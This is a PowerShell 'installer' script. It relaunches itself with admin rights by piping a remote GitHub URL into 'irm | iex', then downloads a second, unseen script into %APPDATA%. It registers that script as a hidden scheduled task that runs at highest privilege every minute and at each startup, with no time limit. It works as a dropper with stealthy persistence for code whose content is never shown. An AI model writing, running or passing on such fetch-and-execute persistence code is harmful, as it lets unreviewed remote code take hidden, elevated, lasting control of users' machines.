# init.ps1 – ONE-TIME installer

# ── Admin ───────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $initUrl = "https://raw.githubusercontent.com/seypopichun/flip/refs/heads/main/init.ps1"
    $urlToPass = if ($rawUrl) { $rawUrl } else { "" }
    Start-Process powershell -Verb RunAs `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$rawUrl='$urlToPass'; irm '$initUrl' | iex }`""
    exit
}
# ─────────────────────────────────────────────────────────────────────────────

# ──  Settings ────────────────────────────────────────────────────────────────
if ([string]::IsNullOrEmpty($rawUrl)) {
    $rawUrl = "https://raw.githubusercontent.com/seypopichun/flip/refs/heads/main/jumping.ps1"
}
$destination = "$env:APPDATA\jumping.ps1"  
$taskName = "AutoJumping"
$intervalMinutes = 1
# ─────────────────────────────────────────────────────────────────────────────

Write-Host "Downloading jumping.ps1....."
Invoke-WebRequest -Uri $rawUrl -OutFile $destination -UseBasicParsing
Write-Host "Saved: $destination"


$action = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$destination`""


$triggerRepeat = New-ScheduledTaskTrigger `
    -Once `
    -At                 ((Get-Date).AddMinutes(1)) `
    -RepetitionInterval ([TimeSpan]::FromMinutes($intervalMinutes))


$triggerBoot = New-ScheduledTaskTrigger -AtStartup

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

Register-ScheduledTask `
    -TaskName $taskName `
    -Action   $action `
    -Trigger  @($triggerRepeat, $triggerBoot) `
    -Settings $settings `
    -RunLevel Highest `
    -Force | Out-Null

Write-Host ""
Write-Host "Done! Task '$taskName' registered."
Write-Host "  Runs every $intervalMinutes min + at every system startup."
Write-Host "  init.ps1 is no longer needed."

